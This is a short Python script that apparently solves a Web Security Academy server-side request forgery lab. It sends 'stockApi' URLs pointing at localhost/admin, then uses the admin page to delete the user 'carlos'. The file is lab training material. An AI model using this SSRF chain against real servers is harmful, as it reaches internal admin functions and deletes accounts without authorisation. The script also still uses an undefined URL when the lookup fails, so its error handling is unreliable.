from web_security_academy.core.utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin


def solve_lab(session):
    path = "/product/stock"
    data = {"stockApi": "http://localhost/admin"}

    print_info(
        f'Performing an SSRF attack by sending a POST request to "{path}" with the following data:'
    )
    print(f"{data}")

    resp = session.post_path(path, data=data)
    print_success("POST request sent successfully.\n")

    print_info("Using the response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        print_fail("Unable to find URL.")
    else:
        ssrf = urljoin("http://localhost/", tag.get("href"))
        print_success(f"Found URL: {ssrf}\n")

    data = {"stockApi": ssrf}
    print_info(
        f'Deleting the user carlos by sending a POST request to "{path}" with the following data:'
    )
    print(f"{data}")

    resp = session.post_path(path, data=data)
    print_success("POST request sent successfully.\n")
